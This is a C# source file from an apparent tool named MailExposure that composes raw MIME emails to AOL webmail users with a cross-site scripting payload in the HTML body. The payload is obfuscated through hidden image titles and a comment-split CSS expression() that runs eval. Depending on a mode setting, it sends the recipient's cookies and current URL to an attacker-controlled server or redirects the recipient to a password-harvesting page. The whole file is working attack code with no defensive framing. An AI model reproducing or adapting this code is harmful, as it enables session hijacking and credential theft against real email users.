using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using MailExposure.RecordInfo;

namespace MailExposure.MailXssCode
{
    class Aol
    {
        // Fields
        private string CRLF;

        // Methods
        public Aol()
        {
            CRLF = "\r\n";
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            if (model.AttachmentName == null)
            {
                return ("From:" + model.Nickname + "<" + model.Addresser + ">" + this.CRLF + "To:" + model.Addressee + this.CRLF + "Subject:" + model.Subject + this.CRLF + "MIME-Version: 1.0" + this.CRLF + "Content-Type: multipart/mixed;" + this.CRLF + "\tboundary=\"----=_Part_116410_1729540330.1274776237859\"" + this.CRLF + this.CRLF + "------=_Part_116410_1729540330.1274776237859" + this.CRLF + "Content-Type: multipart/alternative;" + this.CRLF + "\tboundary=\"----=_Part_116412_1100804047.1274776237859\"" + this.CRLF + this.CRLF + "------=_Part_116412_1100804047.1274776237859" + this.CRLF + "Content-Type: text/html; charset=\"GB2312\"" + this.CRLF + "Content-Transfer-Encoding: base64" + this.CRLF + this.CRLF + model.EncodeBase64(model.XSSCode + model.Content + "</div>") + this.CRLF + "------=_Part_116412_1100804047.1274776237859--" + this.CRLF + this.CRLF + "." + this.CRLF);
            }
            string code = new StreamReader(model.AttachmentSrc, Encoding.GetEncoding("gb2312")).ReadToEnd();
            return string.Concat(new object[] 
            { 
                "MIME-Version: 1.0", this.CRLF, "Content-Type: multipart/mixed; boundary=Mail_Boundary_00201010", this.CRLF, "From:", model.Nickname, "<", model.Addresser, ">", this.CRLF, "To:", model.Addressee, this.CRLF, "Subject:", model.Subject, this.CRLF, 
                this.CRLF, "Content-Type: multipart/alternative; boundary=Mail_Boundary_00201010", this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=utf-8", this.CRLF, "Content-Transfer-Encoding: 7bit", this.CRLF, this.CRLF, this.CRLF, model.Content, model.XSSCode, this.CRLF, this.CRLF, 
                "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html; charset=utf-8 name=", model.AttachmentName, this.CRLF, "Content-Transfer-Encoding: base64", this.CRLF, "Content-Disposition: attachment;filename=", model.AttachmentName, this.CRLF, this.CRLF, '<', model.EncodeBase64(code), '>', this.CRLF, "--Mail_Boundary_00201010--", 
                this.CRLF, this.CRLF, '.', this.CRLF
            });
        }

        private void Xss(Model model)
        {
            Record record = new Record();
            if (model.Type == "Cookie")
            {
                model.Address = "http://" + record.Dns("") + "/aol/index.asp?";
                model.XSSCode = "<img id=\"mylyy\" width=1 height=1 src=\"#\" title=\"new Image().src='" + model.Address + "uid=" + model.Addressee + "&cookie='+escape(document.cookie);\">" + this.CRLF + "<img id=\"myraya\" width=1 height=1 src=\"#\" title=\"document.location='" + model.Address + "?url='+document.location+'&uid=" + model.Addressee + "&logo=0';\"> " + this.CRLF + "<style>" + this.CRLF + "font,#myp{font:' ';'}" + this.CRLF + "a';" + this.CRLF + "background-image:expr<!--/*' '*/-->ession((window.rrr==1)?'':eval('rrr=1;eval(mylyy.title);eval(myraya.title);'));}'{}/*'*/</style><div id=\"myp\">";
            }
            else if (model.Type == "Password")
            {
                model.Address = "http://" + record.Dns("") + "/aol/index2.asp?";
                model.XSSCode = "<img id=\"mylyy\" width=1 height=1 src=\"#\" title=\"new Image().src='" + model.Address + "uid=" + model.Addressee + "&cookie='+escape(document.cookie);\"> " + this.CRLF + "<img id=\"myraya\" width=1 height=1 src=\"#\" title=\"document.location='" + model.Address + "?url='+document.location+'&uid=" + model.Addressee + "&logo=0';\"> " + this.CRLF + "<style>" + this.CRLF + "font,#myp{font:' ';'}" + this.CRLF + "a';" + this.CRLF + "background-image:expr<!--/*' '*/-->ession((window.rrr==1)?'':eval('rrr=1;eval(mylyy.title);eval(myraya.title);'));}'{}/*'*/</style><div id=\"myp\">";
            }
            else if (model.Type == "C+P")
            {
                model.Address = "http://" + record.Dns("") + "/aol/indexcp.asp?";
                model.XSSCode = "<img id=\"mylyy\" width=1 height=1 src=\"#\" title=\"new Image().src='" + model.Address + "uid=" + model.Addressee + "&cookie='+escape(document.cookie);\"> " + this.CRLF + "<img id=\"myraya\" width=1 height=1 src=\"#\" title=\"document.location='" + model.Address + "?url='+document.location+'&uid=" + model.Addressee + "&logo=0';\"> " + this.CRLF + "<style>" + this.CRLF + "font,#myp{font:' ';'}" + this.CRLF + "a';" + this.CRLF + "background-image:expr<!--/*' '*/-->ession((window.rrr==1)?'':eval('rrr=1;eval(mylyy.title);eval(myraya.title);'));}'{}/*'*/</style><div id=\"myp\">";
            }
        }
    }
}
